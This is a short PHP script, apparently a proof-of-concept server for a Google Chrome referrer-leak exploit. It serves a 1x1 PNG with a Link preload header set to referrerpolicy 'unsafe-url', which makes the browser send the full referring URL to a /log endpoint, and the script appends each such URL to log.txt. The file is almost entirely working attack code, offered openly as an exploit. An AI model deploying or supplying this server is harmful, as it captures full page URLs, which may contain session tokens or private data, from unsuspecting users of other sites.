<?php
//Get the endpoint being requsted
$page = explode("?",$_SERVER["REQUEST_URI"])[0];
if( $page === '/img.png' ){
  header("Content-Type: image/png");
  //Add the below header to exploit Google Chrome Referrer leak
  header('Link: </log>;rel="preload"; as="image"; referrerpolicy="unsafe-url"');
  //Return a 1x1 png file
  echo base64_decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAApJREFUCNdjYAAAAAIAAeIhvDMAAAAASUVORK5CYII=");
  exit();
}elseif( $page === '/log' ){
  //save the Referrer to log.txt
  file_put_contents('log.txt', $_SERVER["HTTP_REFERER"]."\n" , FILE_APPEND  );
  echo "OK"; 
}else{
  echo "Page Not Found";
}
